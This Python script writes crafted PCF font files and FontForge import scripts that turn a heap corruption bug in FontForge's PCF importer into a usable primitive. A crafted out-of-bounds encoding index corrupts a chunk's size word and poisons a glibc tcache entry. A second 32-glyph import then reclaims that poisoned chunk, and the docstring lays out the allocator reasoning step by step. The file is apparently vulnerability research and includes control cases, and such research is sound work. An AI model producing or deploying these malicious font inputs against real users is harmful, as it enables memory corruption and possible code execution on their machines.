#!/usr/bin/env python3
"""Craft PCFs that turn W5's poisoned tcache entry into a real consumer.

W5 (size-91.pcf, 4 metrics glyphs) corrupts the low half of the 0x20-sized
`encs` chunk's size word to 0x91 and frees it into tcache[7] (the 0x90 bin).
On this glibc a `calloc(16,8)` does NOT draw from tcache; a `malloc(128)`
does. PcfReadBitmaps (fvimportbdf.c:1675) executes

    offsets = malloc(cnt*sizeof(int));

With 32 bitmap glyphs that request is 128 bytes -> a 0x90 chunk, so a SECOND
Import() of a 32-glyph PCF consumes the entry poisoned by the first Import().

  consumer-91.pcf       15 metrics glyphs; one index cut after low byte 0xfe
                        -> glyph -2, value 0x91 written at encs-8
  consumer-complete.pcf 15 glyphs, in-bounds index control
  sponge-32.pcf         32 glyphs, complete encoding table; its
                        offsets = malloc(128) is the real consumer

PROPERTIES is copied byte-for-byte from the pinned truncated.pcf.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = (HERE / "truncated.pcf").read_bytes()
PROPS = BASE[0x48:0x94]


def make_pcf(nglyphs, enc_bytes, min1=0x0091):
    bpg = 8                       # 1 byte/line * 8 rows (ascent 8, descent 0)
    bitmap_bytes = nglyphs * bpg
    off_props = 0x08 + 4 * 16
    off_metrics = off_props + len(PROPS)
    metrics = struct.pack("<II", 0, nglyphs) + b"".join(
        struct.pack("<hhhhhh", 0, 8, 8, 8, 0, 0) for _ in range(nglyphs)
    )
    off_bitmaps = off_metrics + len(metrics)
    bitmaps = struct.pack("<II", 0, nglyphs)
    bitmaps += b"".join(struct.pack("<I", i * bpg) for i in range(nglyphs))
    bitmaps += struct.pack("<IIII", bitmap_bytes, bitmap_bytes,
                           bitmap_bytes, bitmap_bytes)
    bitmaps += bytes(bitmap_bytes)
    off_enc = off_bitmaps + len(bitmaps)
    toc = [
        (1, 0, len(PROPS) // 4, off_props),
        (4, 0, len(metrics) // 4, off_metrics),
        (8, 0, len(bitmaps) // 4, off_bitmaps),
        (32, 0, 4, off_enc),
    ]
    out = bytearray(struct.pack("<II", 0x70636601, 4))
    for entry in toc:
        out += struct.pack("<IIII", *entry)
    assert len(out) == off_props
    out += PROPS
    assert len(out) == off_metrics
    out += metrics
    assert len(out) == off_bitmaps
    out += bitmaps
    assert len(out) == off_enc
    out += struct.pack("<IHHHHH", 0, 0, 0, min1, min1, 0) + enc_bytes
    return bytes(out)


CASES = {
    "consumer-91.pcf":       make_pcf(15, bytes([0xFE])),
    "consumer-complete.pcf": make_pcf(15, struct.pack("<H", 0x0001)),
    "sponge-32.pcf":         make_pcf(32, b"".join(struct.pack("<H", i)
                                                   for i in range(32)), 0),
}
for name, data in CASES.items():
    (HERE / name).write_bytes(data)
    print(f"{name}: {len(data)} bytes, metrics={struct.unpack_from('<I', data, 0x9c)[0]}")

(HERE / "import-consumer-91.ff").write_text(
    "New()\n" f'Import("{HERE / "consumer-91.pcf"}")\n')
(HERE / "import-consumer-complete.ff").write_text(
    "New()\n" f'Import("{HERE / "consumer-complete.pcf"}")\n')
(HERE / "import-sponge.ff").write_text(
    "New()\n"
    f'Import("{HERE / "consumer-91.pcf"}")\n'
    f'Import("{HERE / "sponge-32.pcf"}")\n')
(HERE / "import-sponge-control.ff").write_text(
    "New()\n"
    f'Import("{HERE / "consumer-complete.pcf"}")\n'
    f'Import("{HERE / "sponge-32.pcf"}")\n')
